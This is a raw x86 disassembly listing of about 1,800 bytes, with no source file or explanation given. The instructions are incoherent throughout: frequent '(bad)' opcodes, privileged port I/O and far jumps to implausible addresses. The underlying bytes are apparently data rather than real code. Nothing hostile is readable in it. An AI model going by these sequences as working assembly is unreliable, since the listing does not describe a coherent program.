  43e0f0:	mov    dh,0x56
  43e0f2:	out    dx,al
  43e0f3:	iret   
  43e0f4:	cli    
  43e0f5:	lods   eax,DWORD PTR ds:[esi]
  43e0f6:	mov    ds:0x47a7b4dc,al
  43e0fb:	mov    ds:0xe4d5028e,eax
  43e100:	push   cs
  43e101:	mov    cl,0xd7
  43e103:	sbb    DWORD PTR [edx],ebx
  43e105:	popa   
  43e106:	retf   0x9b96
  43e109:	je     0x43e0db
  43e10b:	mov    al,ds:0x448df663
  43e110:	push   es
  43e111:	imul   DWORD PTR [eax+0x7b]
  43e114:	addr16 lahf 
  43e116:	ins    DWORD PTR es:[edi],dx
  43e117:	(bad)  
  43e118:	jle    0x43e0f1
  43e11a:	mov    eax,ds:0x47b591a4
  43e11f:	popa   
  43e120:	cmp    dh,BYTE PTR [eax]
  43e122:	sbb    DWORD PTR [ecx+0x416e07c3],ebp
  43e128:	inc    eax
  43e129:	xchg   ecx,eax
  43e12a:	sub    al,al
  43e12c:	lods   eax,DWORD PTR ds:[esi]
  43e12d:	(bad)  
  43e12f:	loopne 0x43e153
  43e131:	sahf   
  43e132:	jae    0x43e183
  43e134:	outs   dx,DWORD PTR ds:[esi]
  43e135:	pop    esi
  43e136:	jns    0x43e0d9
  43e138:	jbe    0x43e0fc
  43e13a:	in     eax,0xac
  43e13c:	scas   al,BYTE PTR es:[edi]
  43e13d:	cmp    al,0x61
  43e13f:	aad    0x34
  43e141:	xchg   edi,edi
  43e143:	mov    al,ds:0x2cd4d2f
  43e148:	arpl   WORD PTR [ebp+ebp*1+0x7ae4e9a1],bx
  43e14f:	adc    ebp,DWORD PTR [eax]
  43e151:	ret    0xff11
  43e154:	pop    esi
  43e155:	dec    eax
  43e156:	push   esi
  43e157:	cmp    esi,DWORD PTR [ebp+0x30]
  43e15a:	dec    eax
  43e15b:	mov    ss,esp
  43e15d:	push   ecx
  43e15e:	inc    ebp
  43e15f:	test   eax,0x1c0ed224
  43e164:	push   edx
  43e165:	mov    eax,0x4e44833d
  43e16a:	fsubr  DWORD PTR [ebx+0x5e]
  43e16d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e16e:	xlat   BYTE PTR ds:[ebx]
  43e16f:	mov    ch,0x6c
  43e171:	sti    
  43e172:	outs   dx,BYTE PTR ds:[esi]
  43e173:	xchg   ebx,eax
  43e174:	ja     0x43e1ea
  43e176:	xor    al,0xa1
  43e178:	sbb    ebx,DWORD PTR [edi]
  43e17a:	jmp    0x43e16b
  43e17c:	dec    edx
  43e17d:	adc    esp,edi
  43e17f:	mov    ecx,0xcaeff26f
  43e184:	mov    esi,0xc1f36def
  43e189:	pusha  
  43e18a:	outs   dx,BYTE PTR ds:[esi]
  43e18b:	sub    BYTE PTR [ecx],0x8b
  43e18e:	imul   eax,edi,0x1e
  43e191:	mov    eax,ds:0x7000ee
  43e196:	popf   
  43e197:	fcomip st,st(4)
  43e199:	(bad)  
  43e19b:	mov    al,ds:0xf42ffd92
  43e1a0:	rol    BYTE PTR [edx+0xf5e70a2],1
  43e1a6:	jp     0x43e21e
  43e1a8:	adc    eax,0xbd96cb06
  43e1ad:	pop    esi
  43e1ae:	dec    ebp
  43e1af:	inc    esi
  43e1b0:	mov    DWORD PTR [edi-0x68],ebx
  43e1b3:	aad    0x7d
  43e1b5:	mov    eax,0x5bb46d62
  43e1ba:	out    dx,al
  43e1bb:	icebp  
  43e1bc:	hlt    
  43e1bd:	add    bh,BYTE PTR [edi+0x2e]
  43e1c0:	adc    eax,0xbba1802e
  43e1c5:	cld    
  43e1c6:	xor    DWORD PTR es:[ebp+eiz*1+0x2e],edi
  43e1cb:	sbb    dh,BYTE PTR [esi]
  43e1cd:	adc    al,0x51
  43e1cf:	and    DWORD PTR [edi],eax
  43e1d1:	add    bl,BYTE PTR [eax-0x80]
  43e1d4:	push   edx
  43e1d5:	inc    ebx
  43e1d6:	adc    DWORD PTR [ecx-0x4698257e],esp
  43e1dc:	lahf   
  43e1dd:	adc    eax,0xb45e33c0
  43e1e2:	(bad)  ds:0xcc2920f2
  43e1e8:	out    0x67,al
  43e1ea:	xlat   BYTE PTR ds:[ebx]
  43e1eb:	fstp   QWORD PTR [esi+0x2d]
  43e1ee:	(bad)  
  43e1ef:	mov    ebp,0x3c9eed9b
  43e1f4:	pop    esi
  43e1f5:	sti    
  43e1f6:	(bad)  
  43e1f7:	out    dx,eax
  43e1f8:	aad    0xb
  43e1fa:	(bad)  
  43e1fb:	push   eax
  43e1fc:	les    esp,FWORD PTR [esi]
  43e1fe:	(bad)  [eax-0x4d60c174]
  43e204:	imul   esp,ebp,0xb45e74d4
  43e20a:	stos   DWORD PTR es:[edi],eax
  43e20b:	jmp    0x43e263
  43e20d:	xchg   ebx,eax
  43e20e:	lods   eax,DWORD PTR ds:[esi]
  43e20f:	mov    DWORD PTR [eax+eiz*2-0x6333c61c],ebx
  43e216:	inc    DWORD PTR [edi+edi*2-0x7129fdf3]
  43e21d:	and    bl,0xa0
  43e220:	inc    eax
  43e221:	es cmp eax,0xa0f6439e
  43e228:	xchg   esi,eax
  43e229:	xor    ebx,DWORD PTR [ebx]
  43e22b:	pop    ss
  43e22c:	icebp  
  43e22d:	jae    0x43e1f0
  43e22f:	jecxz  0x43e291
  43e231:	pop    ss
  43e232:	fwait
  43e233:	mov    ebp,0x80e92cad
  43e238:	sbb    ah,BYTE PTR [ebx]
  43e23a:	push   ds
  43e23b:	jnp    0x43e289
  43e23d:	es mov ch,0xa0
  43e240:	popa   
  43e241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e242:	cs mov ecx,0xd796b048
  43e248:	pop    ebx
  43e249:	ret    0xd87a
  43e24c:	push   ds
  43e24d:	jnp    0x43e24d
  43e24f:	sub    al,0x90
  43e251:	data16 cmc 
  43e253:	xor    ch,ah
  43e255:	stos   BYTE PTR es:[edi],al
  43e256:	pop    ss
  43e257:	mov    eax,ds:0xa4f2f8fd
  43e25c:	stos   DWORD PTR es:[edi],eax
  43e25d:	(bad)  
  43e25f:	sbb    BYTE PTR [esi-0x3e],bl
  43e262:	je     0x43e2a7
  43e264:	pusha  
  43e265:	adc    ebp,DWORD PTR [eax-0x55]
  43e268:	push   cs
  43e269:	popa   
  43e26a:	(bad)  
  43e26c:	cmp    ah,0xb8
  43e26f:	mov    ebp,0x2eee5821
  43e274:	lahf   
  43e275:	inc    esi
  43e276:	stos   DWORD PTR es:[edi],eax
  43e277:	dec    ecx
  43e278:	inc    edi
  43e279:	cmp    bl,bh
  43e27b:	mov    al,ds:0x43cefc06
  43e280:	inc    eax
  43e281:	jb     0x43e2fb
  43e283:	sbb    BYTE PTR [esi+0xd],0xa4
  43e287:	enter  0x3e2b,0x2
  43e28b:	(bad)  
  43e28c:	or     al,0x4f
  43e28e:	not    DWORD PTR [ebp+0x69666131]
  43e294:	shl    DWORD PTR [edi+0x595ea072],cl
  43e29a:	ins    BYTE PTR es:[edi],dx
  43e29b:	mov    dh,0x6d
  43e29d:	bound  edx,QWORD PTR [esi-0x389f0ba0]
  43e2a3:	mov    ah,0xd
  43e2a5:	sti    
  43e2a6:	lock icebp 
  43e2a8:	xchg   esp,eax
  43e2a9:	fsub   st,st(7)
  43e2ab:	leave  
  43e2ac:	add    edi,DWORD PTR [ebx]
  43e2ae:	jno    0x43e2e4
  43e2b0:	mov    edi,0x9d4e0eaa
  43e2b5:	aad    0x5b
  43e2b7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e2b8:	mov    ds:0x8eec428e,al
  43e2bd:	add    al,0xbe
  43e2bf:	rcr    BYTE PTR [edi-0x54],1
  43e2c2:	sub    eax,0x9ed0a675
  43e2c7:	sub    eax,0xcaee37e3
  43e2cc:	or     BYTE PTR [ebx],ah
  43e2ce:	ins    BYTE PTR es:[edi],dx
  43e2cf:	xlat   BYTE PTR ds:[ebx]
  43e2d0:	scas   eax,DWORD PTR es:[edi]
  43e2d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e2d2:	(bad)  
  43e2d3:	push   0x4b0a6127
  43e2d8:	sub    al,0x56
  43e2da:	neg    cl
  43e2dc:	adc    BYTE PTR [esi-0x6d0e8512],bh
  43e2e2:	retf   0x8d7
  43e2e5:	fidivr DWORD PTR [ebx-0x5f]
  43e2e8:	call   0x7f13:0x434cffe9
  43e2ef:	in     eax,dx
  43e2f0:	pop    esi
  43e2f1:	inc    esp
  43e2f2:	cld    
  43e2f3:	fnsave [edi+0x3c7a0e2c]
  43e2f9:	popa   
  43e2fa:	jmpw   0xa719
  43e2fe:	push   edi
  43e2ff:	fimul  DWORD PTR [ecx]
  43e301:	mov    edx,0x935143ee
  43e306:	jmp    0xf5f8bff9
  43e30b:	mov    al,ds:0x2e61cd62
  43e310:	push   ds
  43e311:	out    0x85,eax
  43e313:	gs pop esi
  43e315:	clc    
  43e316:	popf   
  43e317:	and    esi,DWORD PTR [edi]
  43e319:	cwde   
  43e31a:	mov    ebx,0xfd608d87
  43e31f:	cmp    bh,dh
  43e321:	jnp    0x43e340
  43e323:	ins    DWORD PTR es:[edi],dx
  43e324:	in     eax,0x55
  43e326:	in     eax,0x6b
  43e328:	pop    esi
  43e329:	neg    BYTE PTR [edx]
  43e32b:	jno    0x43e2b3
  43e32d:	jo     0x43e309
  43e32f:	mov    DWORD PTR [eax+0x424e9d51],edx
  43e335:	je     0x43e345
  43e337:	pop    edi
  43e338:	aad    0x9f
  43e33a:	loop   0x43e36e
  43e33c:	pop    esi
  43e33d:	pushf  
  43e33e:	jmp    0xf1b9:0xeaa220c
  43e345:	pusha  
  43e346:	jo     0x43e39d
  43e348:	les    ebx,FWORD PTR [edx-0x2c6dbcec]
  43e34e:	out    dx,al
  43e34f:	jp     0x43e2e7
  43e351:	dec    edi
  43e352:	in     eax,dx
  43e353:	in     al,0xaf
  43e355:	ins    DWORD PTR es:[edi],dx
  43e356:	and    BYTE PTR [edx-0x685de846],0x7c
  43e35d:	push   cs
  43e35e:	jbe    0x43e2e5
  43e360:	ja     0x43e398
  43e362:	out    dx,al
  43e363:	mov    ds:0x17a3cd63,eax
  43e368:	mov    BYTE PTR [esi],bl
  43e36a:	test   eax,0x43b1eb9e
  43e36f:	neg    BYTE PTR [esi+0x4497c0e4]
  43e375:	ins    DWORD PTR es:[edi],dx
  43e376:	add    eax,eax
  43e378:	aad    0x12
  43e37a:	outs   dx,BYTE PTR ds:[esi]
  43e37b:	fmul   st(7),st
  43e37d:	call   0x28225008
  43e382:	(bad)  
  43e383:	lea    esp,[esi]
  43e385:	int    0x93
  43e387:	popa   
  43e388:	push   cs
  43e389:	xor    eax,0xfa853218
  43e38e:	ret    0x8289
  43e391:	pusha  
  43e392:	xor    edi,DWORD PTR [eax]
  43e394:	cwde   
  43e395:	ror    BYTE PTR [esi],0xfb
  43e398:	add    BYTE PTR [edx+0x8],bl
  43e39b:	lods   eax,DWORD PTR ds:[esi]
  43e39c:	ins    BYTE PTR es:[edi],dx
  43e39d:	mov    edi,0x7203b11d
  43e3a2:	cmp    esi,ebp
  43e3a4:	pop    esi
  43e3a5:	jae    0x43e3cf
  43e3a7:	sub    esi,esp
  43e3a9:	mov    dh,0xb5
  43e3ab:	loop   0x43e3e9
  43e3ad:	pop    edx
  43e3ae:	mov    ds:0xcd057413,eax
  43e3b3:	rcr    BYTE PTR [ebx+0x5d9b55d5],0x10
  43e3ba:	lahf   
  43e3bb:	scas   eax,DWORD PTR es:[edi]
  43e3bc:	push   edi
  43e3bd:	cmp    al,0xbf
  43e3bf:	sub    al,0x86
  43e3c1:	imul   ecx,DWORD PTR [ebx+0x5ef6cca4],0xffffffb7
  43e3c8:	cld    
  43e3c9:	push   eax
  43e3ca:	jne    0x43e441
  43e3cc:	pop    edi
  43e3cd:	mov    eax,ds:0xc05e87c3
  43e3d2:	imul   ebx,eax,0x76cc47a7
  43e3d8:	or     al,0x61
  43e3da:	cmp    ch,BYTE PTR [esi+0x4d]
  43e3dd:	pop    edi
  43e3de:	mov    dh,0x1
  43e3e0:	les    ecx,FWORD PTR ds:0x1f5e174a
  43e3e6:	dec    eax
  43e3e7:	adc    al,dh
  43e3e9:	sbb    DWORD PTR [eax-0x75],esi
  43e3ec:	test   al,0x5d
  43e3ee:	or     ecx,DWORD PTR [edx+0x75]
  43e3f1:	push   esp
  43e3f2:	and    BYTE PTR [esi],dl
  43e3f4:	aad    0x92
  43e3f6:	mov    bl,0x70
  43e3f8:	inc    ecx
  43e3f9:	pusha  
  43e3fa:	out    dx,al
  43e3fb:	sbb    edi,ecx
  43e3fd:	jg     0x43e3eb
  43e3ff:	push   edx
  43e400:	jo     0x43e3e0
  43e402:	jmp    DWORD PTR [eax+0x76b22920]
  43e408:	or     eax,0x34f798ca
  43e40d:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e40f:	and    eax,0x631ebe38
  43e414:	sahf   
  43e415:	xchg   ebx,eax
  43e416:	pop    ebx
  43e417:	inc    ebp
  43e418:	mov    esi,0x87bc0659
  43e41d:	gs stos DWORD PTR es:[edi],eax
  43e41f:	mov    al,0x3c
  43e421:	jecxz  0x43e453
  43e423:	jb     0x43e483
  43e425:	cmc    
  43e426:	ret    
  43e427:	shr    edx,0x20
  43e42a:	cmc    
  43e42b:	jp     0x43e430
  43e42d:	popa   
  43e42e:	adc    al,BYTE PTR [ebp-0x3c625222]
  43e434:	(bad)  
  43e435:	adc    DWORD PTR [ebp+0x6d],esp
  43e438:	daa    
  43e439:	stc    
  43e43a:	out    dx,al
  43e43b:	ja     0x43e3ef
  43e43d:	mov    edx,?
  43e43f:	inc    ebx
  43e440:	clc    
  43e441:	popa   
  43e442:	mov    ch,0xa0
  43e444:	data16 fadd DWORD PTR [esi-0x67f3af9e]
  43e44b:	outs   dx,DWORD PTR ds:[esi]
  43e44c:	pop    esi
  43e44d:	xchg   ebx,eax
  43e44e:	ret    
  43e44f:	inc    eax
  43e450:	dec    edx
  43e451:	jmp    0x6138b7ad
  43e456:	adc    eax,0xbde74c3e
  43e45b:	rol    BYTE PTR [ebx-0x45],0xeb
  43e45f:	sti    
  43e460:	mov    bl,0x53
  43e462:	je     0x43e479
  43e464:	aad    0xe8
  43e466:	dec    esi
  43e467:	out    0x99,al
  43e469:	dec    ebp
  43e46a:	cdq    
  43e46b:	inc    esi
  43e46c:	xor    ah,BYTE PTR [ecx+0x5e]
  43e46f:	mov    cl,0x75
  43e471:	cmp    BYTE PTR [ebp+0x20b85e99],cl
  43e477:	stos   DWORD PTR es:[edi],eax
  43e478:	movd   DWORD PTR [ecx],mm4
  43e47b:	dec    ebx
  43e47c:	jb     0x43e4de
  43e47e:	inc    eax
  43e47f:	push   ecx
  43e480:	sbb    DWORD PTR [eax+0x33],ebp
  43e483:	(bad)  
  43e485:	sub    dh,ch
  43e487:	mov    al,0x25
  43e489:	imul   esp,DWORD PTR [ebx],0x4
  43e48c:	xchg   edx,eax
  43e48d:	mul    esi
  43e48f:	idiv   BYTE PTR [ebx+0x5be1c362]
  43e495:	stos   DWORD PTR es:[edi],eax
  43e496:	inc    ebp
  43e497:	adc    DWORD PTR [esi-0x316fd0d3],ecx
  43e49d:	retf   0x7b8d
  43e4a0:	pop    esi
  43e4a1:	clc    
  43e4a2:	xor    ah,0x30
  43e4a5:	paddq  mm2,QWORD PTR [edi]
  43e4a8:	popa   
  43e4a9:	popa   
  43e4aa:	inc    ecx
  43e4ab:	enter  0xb0f3,0xf
  43e4af:	fld    TBYTE PTR [ebp-0x1e]
  43e4b2:	adc    eax,DWORD PTR cs:[esi-0x52ff5d9f]
  43e4b9:	pusha  
  43e4ba:	daa    
  43e4bb:	pop    eax
  43e4bc:	adc    esp,DWORD PTR [esi-0x79]
  43e4bf:	and    al,BYTE PTR [ebx+0x48]
  43e4c2:	dec    ebp
  43e4c3:	icebp  
  43e4c4:	dec    ebx
  43e4c5:	push   edx
  43e4c6:	out    dx,al
  43e4c7:	repnz dec ebp
  43e4c9:	or     BYTE PTR [edx+edi*1],bh
  43e4cc:	dec    edi
  43e4cd:	in     al,0xaa
  43e4cf:	mov    ds:0x111be12,al
  43e4d4:	lods   al,BYTE PTR ds:[esi]
  43e4d5:	adc    eax,0xca79296e
  43e4da:	mov    ds:0x23885ec1,eax
  43e4df:	pop    esi
  43e4e0:	xchg   edi,eax
  43e4e1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e4e2:	mul    DWORD PTR [edi+eiz*8+0x60]
  43e4e6:	mov    es,WORD PTR [ecx]
  43e4e8:	loop   0x43e4dd
  43e4ea:	push   ecx
  43e4eb:	call   0x2f3226cc
  43e4f0:	or     DWORD PTR [eax+0x0],esp
  43e4f3:	fwait
  43e4f4:	js     0x43e48f
  43e4f6:	loope  0x43e498
  43e4f8:	mov    al,ds:0xbbba921a
  43e4fd:	dec    esi
  43e4fe:	out    dx,eax
  43e4ff:	sub    eax,0x45e4ba5f
  43e504:	shl    ebp,1
  43e506:	sbb    DWORD PTR [ecx+0x40],esi
  43e509:	xor    eax,0x3f77a0e1
  43e50e:	push   ebx
  43e50f:	sbb    BYTE PTR [edx],ah
  43e511:	and    DWORD PTR [esi+0x23],esp
  43e514:	xor    ebx,edi
  43e516:	sub    DWORD PTR [ecx],esp
  43e518:	pop    ebp
  43e519:	shl    BYTE PTR [eax+0x554cf76e],1
  43e51f:	icebp  
  43e520:	add    ah,BYTE PTR [ebx+ebp*4]
  43e523:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43e524:	push   esp
  43e525:	sub    eax,0x49c233f1
  43e52a:	adc    BYTE PTR [ecx-0x592efe91],dh
  43e530:	pop    esi
  43e531:	retf   0x2f07
  43e534:	dec    ebx
  43e535:	add    al,ah
  43e537:	sub    al,0xba
  43e539:	pusha  
  43e53a:	jns    0x43e583
  43e53c:	fwait
  43e53d:	das    
  43e53e:	les    edx,FWORD PTR [ebp-0x39f71da3]
  43e544:	jnp    0x43e502
  43e546:	out    dx,al
  43e547:	imul   DWORD PTR [esi-0x6ed69d63]
  43e54d:	push   esi
  43e54e:	icebp  
  43e54f:	(bad)  
  43e550:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e551:	jmp    0x684b:0xfd33a55a
  43e558:	sbb    eax,0x4ea0f7fa
  43e55d:	out    dx,al
  43e55e:	(bad)  
  43e55f:	push   0x5e
  43e561:	gs mov ?,ebp
  43e564:	sbb    esi,DWORD PTR [ebx-0x5a]
  43e567:	inc    ebx
  43e568:	xchg   ecx,eax
  43e569:	pusha  
  43e56a:	xchg   edx,eax
  43e56b:	fcom   st(7)
  43e56d:	pop    eax
  43e56e:	stos   DWORD PTR es:[edi],eax
  43e56f:	rcr    DWORD PTR [eax],0x2
  43e572:	jmp    0x43e5d1
  43e574:	push   esi
  43e575:	xchg   ecx,eax
  43e576:	and    al,0xba
  43e578:	inc    esp
  43e579:	call   0x6fd6d1e2
  43e57e:	adc    esp,DWORD PTR [ecx+0x3b230c3f]
  43e584:	xchg   esp,eax
  43e585:	mov    eax,ds:0x345e7437
  43e58a:	cmp    DWORD PTR [ebp+0x1fc1e41c],0xffffffe0
  43e591:	pusha  
  43e592:	stc    
  43e593:	xlat   BYTE PTR ds:[ebx]
  43e594:	jmp    0xe37b:0x5ca5a4c3
  43e59b:	xchg   esp,eax
  43e59c:	pusha  
  43e59d:	pop    edx
  43e59e:	or     cl,BYTE PTR [edx]
  43e5a0:	mov    ah,0x8d
  43e5a2:	mov    fs,esp
  43e5a4:	adc    eax,0x7a5ebee2
  43e5a9:	mov    fs,WORD PTR [ecx]
  43e5ab:	lods   eax,DWORD PTR ds:[esi]
  43e5ac:	mov    ecx,0x1d006ea9
  43e5b1:	lds    ecx,FWORD PTR [edi-0x1113de6f]
  43e5b7:	xchg   esi,eax
  43e5b8:	scas   al,BYTE PTR es:[edi]
  43e5b9:	(bad)  
  43e5ba:	sub    eax,0x115fa2c7
  43e5bf:	mov    ds:0xaf1f3f52,eax
  43e5c4:	jbe    0x43e601
  43e5c6:	into   
  43e5c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e5c8:	pop    ecx
  43e5c9:	test   al,0xee
  43e5cb:	jb     0x43e566
  43e5cd:	(bad)  
  43e5ce:	jnp    0x43e5d2
  43e5d0:	(bad)  
  43e5d1:	nop
  43e5d2:	scas   al,BYTE PTR es:[edi]
  43e5d3:	mov    al,ds:0xe9a5995a
  43e5d8:	pop    ds
  43e5d9:	icebp  
  43e5da:	pop    ecx
  43e5db:	sbb    esi,edx
  43e5dd:	sub    edi,edx
  43e5df:	push   ds
  43e5e0:	pop    esi
  43e5e1:	stos   BYTE PTR es:[edi],al
  43e5e2:	adc    eax,0x88c0acb3
  43e5e7:	stc    
  43e5e8:	(bad)  [eax+0x7e]
  43e5eb:	and    ch,BYTE PTR [eax]
  43e5ed:	je     0x43e653
  43e5ef:	jge    0x43e572
  43e5f1:	mov    ch,0xee
  43e5f3:	out    0x8f,al
  43e5f5:	inc    ecx
  43e5f6:	or     ebp,0xfffffffe
  43e5f9:	sbb    al,0xbb
  43e5fb:	sub    BYTE PTR [ebx+0x60],dh
  43e5fe:	stc    
  43e5ff:	popf   
  43e600:	je     0x43e5f5
  43e602:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  43e604:	mov    ds:0x3ef5ee92,eax
  43e609:	cmp    eax,0x4d925929
  43e60e:	xor    al,0xa8
  43e610:	jl     0x43e688
  43e612:	push   0xd1a0b9d0
  43e617:	push   ds
  43e618:	call   0x7576d4e0
  43e61d:	popf   
  43e61e:	bound  si,DWORD PTR [esi]
  43e621:	fs ret 
  43e623:	mov    al,ds:0x8a17ced6
  43e628:	pop    eax
  43e629:	ret    
  43e62a:	scas   eax,DWORD PTR es:[edi]
  43e62b:	(bad)  
  43e62c:	pop    ebp
  43e62d:	cmp    edx,eax
  43e62f:	xor    BYTE PTR [edi+0x44d8b3e1],al
  43e635:	mov    cl,0xf3
  43e637:	in     eax,dx
  43e638:	out    dx,al
  43e639:	test   eax,0x26061eb
  43e63e:	ss jns 0x43e6c0
  43e641:	scas   eax,DWORD PTR es:[edi]
  43e642:	mov    ch,0x79
  43e644:	jp     0x43e6bf
  43e646:	or     eax,0xcc4d73a1
  43e64b:	imul   ebx,DWORD PTR [ebx-0x1b],0x18
  43e64f:	add    bl,BYTE PTR [esi-0x70]
  43e652:	mov    es,edi
  43e654:	call   0xb0ea442e
  43e659:	pusha  
  43e65a:	fcom   QWORD PTR ds:0xe78db79d
  43e660:	fadd   QWORD PTR [eax-0x12]
  43e663:	into   
  43e664:	jmp    0x1c3da37d
  43e669:	fsub   DWORD PTR [ebp+0x635beba1]
  43e66f:	inc    esi
  43e670:	mov    BYTE PTR [edi-0x63],dl
  43e673:	loopne 0x43e6d2
  43e675:	xchg   edx,eax
  43e676:	shl    DWORD PTR [ecx-0x17d9c9c4],1
  43e67c:	sbb    dh,al
  43e67e:	outs   dx,BYTE PTR ds:[esi]
  43e67f:	pop    edx
  43e680:	data16 add al,0x94
  43e683:	lods   al,BYTE PTR ds:[esi]
  43e684:	sub    BYTE PTR [ebx-0x30b05ea5],al
  43e68a:	cmp    bl,BYTE PTR [esi]
  43e68c:	cwde   
  43e68d:	xchg   edx,eax
  43e68e:	jbe    0x43e681
  43e690:	pop    esi
  43e691:	fdivr  st(3),st
  43e693:	add    al,BYTE PTR [esp+eax*4]
  43e696:	and    eax,DWORD PTR ds:[ecx]
  43e699:	popa   
  43e69a:	xchg   edx,eax
  43e69b:	ret    
  43e69c:	call   0xf2fc807b
  43e6a1:	lods   al,BYTE PTR ds:[esi]
  43e6a2:	out    dx,al
  43e6a3:	xchg   ecx,eax
  43e6a4:	cmp    dh,dl
  43e6a6:	aaa    
  43e6a7:	mov    WORD PTR [esi],?
  43e6a9:	stos   DWORD PTR es:[edi],eax
  43e6aa:	repz mov al,ds:0x11a2294a
  43e6b0:	in     al,dx
  43e6b1:	(bad)  
  43e6b2:	fmul   st(3),st
  43e6b4:	pop    ebx
  43e6b5:	std    
  43e6b6:	nop
  43e6b7:	add    ebp,DWORD PTR [edi]
  43e6b9:	sbb    BYTE PTR [ebp+0x1],0x26
  43e6bd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43e6be:	push   esi
  43e6bf:	(bad)  
  43e6c1:	inc    edx
  43e6c2:	dec    ebp
  43e6c3:	mov    ebp,0xe3dea136
  43e6c8:	test   eax,0x5e8dcfe3
  43e6cd:	xchg   esi,eax
  43e6ce:	dec    esp
  43e6cf:	xchg   ebp,eax
  43e6d0:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  43e6d2:	add    ch,BYTE PTR [eax+0x43]
  43e6d5:	popa   
  43e6d6:	jmp    0x8635:0x68fdf4ef
  43e6dd:	pop    ds
  43e6de:	fmul   QWORD PTR [eax+0x64576c5f]
  43e6e4:	adc    ecx,DWORD PTR [esi-0x26]
  43e6e7:	or     BYTE PTR [edi],bl
  43e6e9:	lds    edx,FWORD PTR [edx+0x7b]
  43e6ec:	lds    ebx,FWORD PTR [edi-0x35]
  43e6ef:	sub    eax,0x68231064
  43e6f4:	daa    
  43e6f5:	lods   eax,DWORD PTR ds:[esi]
  43e6f6:	cmp    edi,DWORD PTR [ebx+0x5e]
  43e6f9:	cmp    eax,0xd17c6a8d
  43e6fe:	(bad)  
  43e6ff:	stc    
  43e700:	sub    al,0x61
  43e702:	mov    al,ds:0x14b5f3de
  43e707:	jae    0x43e788
  43e709:	imul   eax,DWORD PTR [ecx],0x51
  43e70c:	inc    ebp
  43e70d:	xor    edi,DWORD PTR [edi]
  43e70f:	inc    edx
  43e710:	ficomp WORD PTR [ecx]
  43e712:	int3   
  43e713:	inc    edx
  43e714:	pushf  
  43e715:	cmp    al,0x63
  43e717:	mov    eax,ds:0xb39201a9
  43e71c:	sti    
  43e71d:	mov    eax,ds:0xa686c457
  43e722:	out    dx,al
  43e723:	mov    al,0xb9
  43e725:	lock stc 
  43e727:	stos   BYTE PTR es:[edi],al
  43e728:	out    dx,al
  43e729:	bnd repz jb 0x43e6b7
  43e72d:	pop    edi
  43e72e:	cmp    ecx,DWORD PTR [ebx]
  43e730:	cdq    
  43e731:	shl    DWORD PTR [eax+0x2a],cl
  43e734:	inc    esi
  43e735:	test   eax,0x6b785051
  43e73a:	out    0xe,eax
  43e73c:	mov    ecx,?
  43e73e:	ret    
  43e73f:	call   0x8c429cdf
  43e744:	aaa    
  43e745:	(bad)  
  43e746:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43e747:	lahf   
  43e748:	mov    ebp,0x3eb5d14a
  43e74d:	dec    ecx
  43e74e:	outs   dx,BYTE PTR ds:[esi]
  43e74f:	xor    al,0xf5
  43e751:	shr    esi,0xb6
  43e754:	outs   dx,DWORD PTR ds:[esi]
  43e755:	adc    al,0x8c
  43e757:	out    0xdb,al
  43e759:	mov    bh,0x27
  43e75b:	mov    eax,ds:0xa2daf131
  43e760:	xchg   edi,edx
  43e762:	inc    eax
  43e763:	dec    ecx
  43e764:	repnz jmp 0xeaee:0x9e48b810
  43e76c:	rcr    BYTE PTR [edx],cl
  43e76e:	add    cl,ah
  43e770:	dec    ebx
  43e771:	popa   
  43e772:	jb     0x43e76d
  43e774:	ret    0x805d
  43e777:	sub    ecx,ebp
  43e779:	(bad)  
  43e77a:	out    dx,al
  43e77b:	mov    DWORD PTR [ebx-0x6c],esp
  43e77e:	push   edi
  43e77f:	clc    
  43e780:	test   eax,0xc5698ccb
  43e785:	pusha  
  43e786:	sbb    al,0xce
  43e788:	jl     0x7ba4b082
  43e78e:	fsub   DWORD PTR [ebp+0x5e]
  43e791:	gs das 
  43e793:	xor    BYTE PTR [ebp-0x38ef30ad],bl
  43e799:	pusha  
  43e79a:	or     eax,DWORD PTR [edi+0x4d]
  43e79d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43e79e:	repnz fist DWORD PTR [ebp-0x739711ee]
  43e7a5:	outs   dx,BYTE PTR ds:[esi]
  43e7a6:	mov    esi,0x7e5dc854
  43e7ab:	mov    eax,ds:0xc285958d
  43e7b0:	bnd ret 0xf38b
  43e7b4:	ins    DWORD PTR es:[edi],dx
  43e7b5:	mov    esp,0x4069d8fc
  43e7ba:	test   DWORD PTR [edx+0x5b],0x25365922
  43e7c1:	test   DWORD PTR [esi+0x64],edi
  43e7c4:	vcvtsd2si esp,QWORD PTR [ecx+0x291a5d51]
  43e7cc:	add    al,dl
  43e7ce:	push   ecx
  43e7cf:	or     ebx,DWORD PTR [esi+0x36]
  43e7d2:	mov    fs,WORD PTR [esi+0x10]
  43e7d5:	test   BYTE PTR [esi+0x34],0xe4
  43e7d9:	pusha  
  43e7da:	jl     0x43e7b8
  43e7dc:	(bad)
  43e7df:	fstp   DWORD PTR [edi+ebp*1]
  43e7e2:	push   esi
  43e7e3:	cmp    DWORD PTR [esi-0x70],ebx
  43e7e6:	pop    edx
  43e7e7:	ror    DWORD PTR [edi-0x36329204],0x60
  43e7ee:	sbb    BYTE PTR [eax],0xfd
  43e7f1:	imul   BYTE PTR [esi+0xe]
  43e7f4:	pop    edx
  43e7f5:	mov    ah,BYTE PTR [edx]
  43e7f7:	adc    DWORD PTR [eax+0x61],eax
  43e7fa:	sti    
  43e7fb:	ins    DWORD PTR es:[edi],dx
  43e7fc:	iret   
  43e7fd:	and    eax,0x6141d2df
  43e802:	jmp    0x43e883
  43e804:	out    0xb5,eax
  43e806:	stc    
  43e807:	and    al,0x9c
  43e809:	pop    ds
  43e80a:	out    dx,al
  43e80b:	loop   0x43e7a2
  43e80d:	and    BYTE PTR ds:0x771547a5,al
